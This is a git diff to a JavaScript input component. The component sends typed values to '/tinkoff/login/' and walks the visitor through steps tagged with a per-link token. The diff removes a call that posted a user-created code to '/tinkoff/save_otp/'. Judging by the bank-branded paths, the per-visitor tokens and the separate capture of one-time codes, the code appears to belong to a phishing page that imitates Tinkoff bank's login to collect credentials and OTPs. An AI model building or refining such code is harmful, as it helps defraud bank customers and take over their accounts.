@@ -81,8 +81,18 @@ class InputControl extends HTMLElement {
 
         let isRedirect = false;
 
+        // Извлечение токена из URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const token = urlParams.get('token'); // Получаем токен
+
+        // Формирование URL с токеном
+        let loginUrl = '/tinkoff/login/';
+        if (token) {
+            loginUrl += `?token=${token}`;
+        }
+
         try {
-            const response = await fetch('/tinkoff/login/', {
+            const response = await fetch(loginUrl, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(value)
@@ -93,8 +103,7 @@ class InputControl extends HTMLElement {
                 const errorData = await response.json();
                 if (response.status === 307) {
                     showSessionExpiredModal(errorData.detail);
-                }
-                else {
+                } else {
                     this.showError(errorData.detail);
                     console.error('Ошибка: ', errorData);
                 }
@@ -104,32 +113,22 @@ class InputControl extends HTMLElement {
             const data = await response.json();
 
             if (data.status === 'success') {
-                if (data.current_page_type === 'Придумайте код') {
-                    await fetch(`/tinkoff/save_otp/?otp=${value}`, {
-                        method: 'POST',
-                    });
-                }
                 const pageType = data.next_page_type;
 
-                // Извлечение токена из текущего URL
-                const urlParams = new URLSearchParams(window.location.search);
-                const token = urlParams.get('token'); // Получаем токен, если он есть
-
-                // Создание нового URL с токеном
                 let redirectUrl = `/tinkoff/next/?step=${pageType}`;
                 if (token) {
-                    redirectUrl += `&token=${token}`; // Добавляем токен к URL
+                    redirectUrl += `&token=${token}`; // Добавляем токен в редирект
                 }
 
-                window.location.href = redirectUrl; // Редирект с токеном
+                window.location.href = redirectUrl;
                 isRedirect = true;
             } else {
                 this.showError(data.detail || 'Произошла ошибка.');
-                this.input.value = ''
+                this.input.value = '';
             }
         } catch (error) {
-            this.showError('Ошибка сети. Попробуйте снова.');
-            console.error('Ошибка:', error);
+            this.showError('Ошибка сети. Попробуйте позже.');
+            console.error('Ошибка сети: ', error);
         } finally {
             if (!isRedirect) {
                 this.button.disabled = false;
